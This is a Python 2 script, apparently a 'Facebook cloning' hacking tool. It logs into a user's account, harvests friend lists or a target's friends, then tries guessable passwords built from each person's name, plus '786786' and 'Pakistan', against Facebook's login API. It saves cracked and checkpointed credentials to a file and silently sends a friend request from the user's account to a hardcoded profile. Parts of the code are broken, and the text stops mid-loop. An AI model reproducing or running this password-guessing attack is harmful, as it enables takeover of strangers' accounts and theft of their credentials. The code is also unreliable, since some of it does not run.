#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To MR-SH4DOW
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] Token :")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')		

#Dev:MR-HUNTTER-ALONE
##### LOGO #####
logo = """

\033[1;91m ░█████╗░███████╗███████╗██╗░█████╗░██╗░█████╗░██╗░░░░░
\033[1;92m ██╔══██╗██╔════╝██╔════╝██║██╔══██╗██║██╔══██╗██║░░░░░
\033[1;94m ██║░░██║█████╗░░█████╗░░██║██║░░╚═╝██║███████║██║░░░░░
\033[1;97m ██║░░██║██╔══╝░░██╔══╝░░██║██║░░██╗██║██╔══██║██║░░░░░
\033[1;93m ╚█████╔╝██║░░░░░██║░░░░░██║╚█████╔╝██║██║░░██║███████╗
\033[1;95m ░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝

\033[1;91m
░█████╗░███████╗███████╗██╗░█████╗░██╗░█████╗░██╗░░░░░
██╔══██╗██╔════╝██╔════╝██║██╔══██╗██║██╔══██╗██║░░░░░
██║░░██║█████╗░░█████╗░░██║██║░░╚═╝██║███████║██║░░░░░
██║░░██║██╔══╝░░██╔══╝░░██║██║░░██╗██║██╔══██║██║░░░░░
 ╚█████╔╝██║░░░░░██║░░░░░██║╚█████╔╝██║██║░░██║███████╗
░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝
                                                   

\033[1;91m•───────────────────────────────────────────•
\033[1;97m•-----------------\033[1;37mKASHI-OFFICAL_ID\033[1;97m-----------------•
 \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\033[1;41m\033[1;37m[⚡🔥\033[1;37mAuthor Name: MR-KASHIF🔥⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡🔥\033[1;37m☏ →+923063112*** 🔥⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡🔥\033[1;37mYT Channel:TECHNICAL KASHI 786🔥⚡\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[⚡🔥 \033[1;37mFACEBOOK ID: K4SH1F.009 🔥⚡\033[1;37m]\033[1;0m
\033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\033[1;97m•-----------------\033[1;37mMR-KASHI-OFFICAL\033[1;97m-----------------•
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mKASHI-OFFICAL█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m───▄▀▀▀▀▀───▄█▀▀▀█▄
\033[1;92m──▐▄▄▄▄▄▄▄▄██▌▀▄▀▐██
\033[1;93m──▐▒▒▒▒▒▒▒▒███▌▀▐███
\033[1;94m───▌▒▓▒▒▒▒▓▒██▌▀▐██
\033[1;95m───▌▓▐▀▀▀▀▌▓─▀▀▀▀▀  
\033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\033[1;97m•───────────────────────────────────────────•
\033[1;91m─────█─▄▀█──█▀▄─█─────\033[1;97m─────█─▄▀█──█▀▄─█───── 
\033[1;91m────▐▌──────────▐▌────\033[1;97m────▐▌──────────▐▌────
\033[1;91m────█▌▀▄──▄▄──▄▀▐█────\033[1;97m────█▌▀▄──▄▄──▄▀▐█────
\033[1;91m───▐██──▀▀──▀▀──██▌───\033[1;97m───▐██──▀▀──▀▀──██▌───
\033[1;91m──▄████▄──▐▌──▄████▄──\033[1;97m──▄████▄──▐▌──▄████▄──    
\033[1;97m•───────────────────────────────────────────•                                                                                                                             

\033[1;96m  _______ ______          __  __ 
\033[1;95m |__   __|  ____|   /\   |  \/  |
 \033[1;97m   | |  | |__     /  \  | \  / |
 \033[1;94m   | |  |  __|   / /\ \ | |\/| |
  \033[1;93m  | |  | |____ / ____ \| |  | |
 \033[1;92m __|_|  |______/_/___ \_\_|_ |_|
\033[1;91m

HHHHHHHHH     HHHHHHHHHUUUUUUUU     UUUUUUUUNNNNNNNN        NNNNNNNNTTTTTTTTTTTTTTTTTTTTTTTEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR             
H:::::::H     H:::::::HU::::::U     U::::::UN:::::::N       N::::::NT:::::::::::::::::::::TE::::::::::::::::::::ER::::::::::::::::R            
H:::::::H     H:::::::HU::::::U     U::::::UN::::::::N      N::::::NT:::::::::::::::::::::TE::::::::::::::::::::ER::::::RRRRRR:::::R           
HH::::::H     H::::::HHUU:::::U     U:::::UUN:::::::::N     N::::::NT:::::TT:::::::TT:::::TEE::::::EEEEEEEEE::::ERR:::::R     R:::::R          
  H:::::H     H:::::H   U:::::U     U:::::U N::::::::::N    N::::::NTTTTTT  T:::::T  TTTTTT  E:::::E       EEEEEE  R::::R     R:::::R          
  H:::::H     H:::::H   U:::::D     D:::::U N:::::::::::N   N::::::N        T:::::T          E:::::E               R::::R     R:::::R          
  H::::::HHHHH::::::H   U:::::D     D:::::U N:::::::N::::N  N::::::N        T:::::T          E::::::EEEEEEEEEE     R::::RRRRRR:::::R           
  H:::::::::::::::::H   U:::::D     D:::::U N::::::N N::::N N::::::N        T:::::T          E:::::::::::::::E     R:::::::::::::RR            
  H:::::::::::::::::H   U:::::D     D:::::U N::::::N  N::::N:::::::N        T:::::T          E:::::::::::::::E     R::::RRRRRR:::::R           
  H::::::HHHHH::::::H   U:::::D     D:::::U N::::::N   N:::::::::::N        T:::::T          E::::::EEEEEEEEEE     R::::R     R:::::R          
  H:::::H     H:::::H   U:::::D     D:::::U N::::::N    N::::::::::N        T:::::T          E:::::E               R::::R     R:::::R          
  H:::::H     H:::::H   U::::::U   U::::::U N::::::N     N:::::::::N        T:::::T          E:::::E       EEEEEE  R::::R     R:::::R          
HH::::::H     H::::::HH U:::::::UUU:::::::U N::::::N      N::::::::N      TT:::::::TT      EE::::::EEEEEEEE:::::ERR:::::R     R:::::R          
H:::::::H     H:::::::H  UU:::::::::::::UU  N::::::N       N:::::::N      T:::::::::T      E::::::::::::::::::::ER::::::R     R:::::R          
H:::::::H     H:::::::H    UU:::::::::UU    N::::::N        N::::::N      T:::::::::T      E::::::::::::::::::::ER::::::R     R:::::R          
HHHHHHHHH     HHHHHHHHH      UUUUUUUUU      NNNNNNNN         NNNNNNN      TTTTTTTTTTT      EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR          
                                                                                                                                               
                                                                                                                                               
                                                                                                                                               
                                                                                                                                               
                                                                                                                                               
                                                                                                                                          
\033[1;92m•───────────────────────────────────────────•
 \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 """
CorrectUsername = "KASHIF"
CorrectPassword = "OFIICIAL"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:ALI-OFIICIAL
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://youtube.com/channel/UCxsi4JIa6F5KU9o1QC7dEpQ')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://youtube.com/channel/UCxsi4JIa6F5KU9o1QC7dEpQ')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;91m[1]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
        time.sleep(0.05)
        print "\033[1;92m[2]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
        time.sleep(0.05)
        print "\033[1;93m[3]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
        time.sleep(0.05)
        print "\033[1;94m[4]\033[1;47m\033[1;31mADD MY ACCOUNT ON FB      \033[1;0m"
        time.sleep(0.05)
	print "\033[1;95m[5]\033[1;47m\033[1;31mADD MY SECOND ACCOUNT ON FB FOR NEED ANY HELP           \033[1;0m"
        time.sleep(0.05)
        print "\033[1;96m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
	time.sleep(0.05)
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97m[+] \033[0;31mSelect Option: \033[1;91m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
        elif peak =="4":
	        os.system('xdg-open https://youtube.com/channel/UCxsi4JIa6F5KU9o1QC7dEpQ')
	        login()
        elif peak =="5":
	        os.system('xdg-open https://www.facebook.com/profile.php?id=K4SH1F.009 ')
                login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print "\033[1;97m•-----------------\033[1;37mKASHI-OFFICAL\033[1;97m-----------------•"
		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
		print('	' )
		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;97mPassword\x1b[1;97m    : \x1b[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\033[1;47m\033[1;91mKASHI-OFFICAL Login Successful\033[1;0m'
				os.system('xdg-open https://youtube.com/channel/UCxsi4JIa6F5KU9o1QC7dEpQ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97m∆CP∆ Creat A New Account")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97m∆CP∆Creat A New Account"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:MR-HUNTTER
	print logo
	print "\033[1;37m[!]\033[1;91m Logged in User Information\033[1;92m"
	time.sleep(0.05)
	print "\033[1;37m[•]\033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
	time.sleep(0.05)
	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
	time.sleep(0.05)
	print "\033[1;97m•-----------------\033[1;37mALI-OFFICAL\033[1;97m-----------------•"
	print "\033[1;92m[1]\033[1;47m\033[1;31mStart Fast Cloning                          \033[1;0m"
	time.sleep(0.05)
	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                     \033[1;0m"
	time.sleep(0.05)
	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update ALI-OFFICAL                         \033[1;0m"
	time.sleep(0.05)
	print "\033[1;95m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
	time.sleep(0.05)
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;31mSelect Option: \033[1;91m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
        elif unikers =="1":		
	        super()
	elif unikers =="2":
		os.system('xdg-open https://youtube.com/channel/UCxsi4JIa6F5KU9o1QC7dEpQ')
	        menu()
	elif unikers =="3":
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;91m=10%')
                jalan("\033[1;92m==20%")
                jalan('\033[1;93m===30%')
                jalan('\033[1;94m====40%')
                jalan("\033[1;95m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;97m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;95m=========90%')
                jalan('\033[1;94m==========100%')
                jalan('\033[1;93mCloning Data Reset and update by ALI-OFFICAL')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('xdg-open https://www.facebook.com/profile.php?id=100003007193319')
	        menu()
	elif unikers =="3":
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataReset\033[1;95m.................."
                jalan('\033[1;91m=10%')
                jalan("\033[1;92m==20%")
                jalan('\033[1;93m===30%')
                jalan('\033[1;94m====40%')
                jalan("\033[1;95m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;97m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;95m=========90%')
                jalan('\033[1;94m==========100%')
                jalan('\033[1;93mCloning Data Reset and update by ALI-OFFICAL')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[1]\033[1;47m\033[1;91mCloneOfficial From Friend List    \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[2]\033[1;47m\033[1;91mCloneOfficial From Public Id \033[1;0m"
	time.sleep(0.05)
	print "\033[1;97m[0]\033[1;47m\033[1;91mBack                     \033[1;0m"
	time.sleep(0.05)
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m[+]\033[1;91mSelect Option: \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print "\033[1;97m•-----------------\033[1;37mALI-OFFICAL\033[1;97m-----------------•"
		print logo
		jalan('\033[1;97m[+]\033[1;91mALI-OFFICAL█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print "\033[1;97m•-----------------\033[1;37mALI-OFFICAL\033[1;97m-----------------•"
		print logo
		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[+]\033[1;91mName\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;97m[+]\033[1;91mKASHI-OFFICAL█████████████████▒▒▒▒▒▒▒▒..100%\033[1;97m:-:"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[+]\033[1;91mTotal Accounts\033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[+]\033[1;31mHacking Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
	print "\n\033[1;97m[+]\x1b[1;31mStop Process Press CTRL+Z"
	print "\033[1;97m•-----------------\033[1;37m\033[1;97m\033[1;97m-----------------•"
 	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:MR-0FFIC9L
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[!] \x1b[1;92m[OK]'											
				print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				    print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b ['name']
				    print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				    print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[!] \x1b[1;92m[OK]'											
				            print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				            print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user								
				            print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[!] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;93m    : \x1b[1;97m' + b['name']
				               print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				               print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[!] \x1b[1;92m[OK]'								
						       print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']									
						       print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user							
						       print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                           print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '1122'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[!] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                   print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
				                                   print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[!] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;93m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                       print '\x1b[1;92m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                       print '\x1b[1;91m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;97m[!] \x1b[1;92m[OK]'						
						                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']							
						                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user					
						                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                           print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user									
				                                                           print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
